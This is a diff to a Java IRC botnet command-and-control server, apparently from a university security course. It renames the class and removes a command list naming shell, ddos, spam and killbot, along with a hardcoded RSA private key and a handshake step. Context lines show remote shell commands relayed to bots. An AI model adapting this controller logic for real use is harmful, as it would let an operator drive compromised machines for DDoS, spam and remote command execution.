@@ -62,9 +62,7 @@ import org.jibble.pircbot.*;
  * 
  * @author Roy McElmurry, Robert Johnson
  */
-public class BotnetServer extends PircBot {
-	private static final String[] COMMANDS = {"help", "names", "list", "shell", "ddos", "spam", "lease", "killbot", "destroybotnet"};
-	
+public class BotnetLeaseServer extends PircBot {	
 	private static final String SENTINEL = "$: ";
 	private static final String TERMINATION = "exit";
 	private static final String SERVER = "eve.cs.washington.edu";
@@ -79,19 +77,15 @@ public class BotnetServer extends PircBot {
 	
 	private MsgEncrypt m;
 	
-	private String rsaPrivateExp = "71297784175965835129840380767799164802935470319035078256080196093715404322248709184148527780402381402614554597184454624893606179190140937773510113822903233272610610852846100680912323528491646248547292219752408338128335385639782016184316596955228926230719596592082572925879510080781616710237803932128786341473";
-	private String rsaMod = "101303910710900226274349030555647780242601234001053700242140440355421711719614388158299014962476550026734960750908999517650997683806704967780217503081010517989368347136612497678731041194040683080313069165522077936751386218907487890298947166101897033800426412821219973850448264931913696365980503099134782271671";
-
 	public static void main(String[] args) {
-		BotnetServer bn = new BotnetServer();
+		BotnetLeaseServer bn = new BotnetLeaseServer();
 	}
 	
 	/**
 	 * Constructs a new BotnetServer object that connects to the IRC channel and awaits commands from the user.
 	 */
-	public BotnetServer() {
+	public BotnetLeaseServer() {
 		m = MsgEncrypt.getInstance();
-		m.genRSAPrivKey(rsaMod + " " + rsaPrivateExp);
 		input = new Scanner(System.in);
 		try {
 			botKeys = new HashMap<String, MsgEncrypt>();
@@ -119,8 +113,6 @@ public class BotnetServer extends PircBot {
 		for (int i = 0; i < bots.length; i++) {
 			if (!bots[i].getNick().equals(NAME)) {
 				System.out.print("\t" + bots[i].toString());
-				//TODO: fill in stuff with key stuff
-				handshake(bots[i].getNick());
 			}
 		}
 		init();
@@ -208,15 +200,7 @@ public class BotnetServer extends PircBot {
 			}
 		//Respond to setop command by acquiring exclusive operator status (DOESN'T WORK)
 		} else if (s.toLowerCase().equalsIgnoreCase("setop")) {
-			//lease leaseMaster duration bot [more bots]
-			String[] parts = s.split(" ");
-			if (parts.length > 3) {
-				String leaseMaster = parts[1];
-				long duration = Long.parseLong(parts[2]);
-				chooseBots(parts, 3);
-			} else {
-				
-			}
+			acquireOpStatus();
 		//Respond to the shell command by sending commands to the specified bot and reading responses until the chat has ended
 		} else if (s.toLowerCase().startsWith("shell")) {
 			String[] parts = s.split(" ");
@@ -349,17 +333,7 @@ public class BotnetServer extends PircBot {
 		if (arr[index].equalsIgnoreCase("all")) {
 			return getUserNames();
 		} else {
-			try {
-				int numBots = Integer.parseInt(arr[index]);
-				String[] names = getUserNames();
-				if (numBots > names.length) {
-					return names;
-				} else {
-					return Arrays.copyOfRange(names, 0, numBots);
-				}
-			} catch (Exception e) {
-				return Arrays.copyOfRange(arr, index, arr.length);
-			}
+			return Arrays.copyOfRange(arr, index, arr.length);
 		}
 	}
 	
@@ -367,7 +341,7 @@ public class BotnetServer extends PircBot {
 		User[] bots = getUsers(CHANNEL);
 		List<String> namesList = new ArrayList<String>();
 		for (User bot : bots) {
-			if (!bot.getNick().equalsIgnoreCase(NAME) && bot.getNick().startsWith("bot")) {
+			if (!bot.getNick().equalsIgnoreCase(NAME)) {
 				namesList.add(bot.getNick());
 			}
 		}
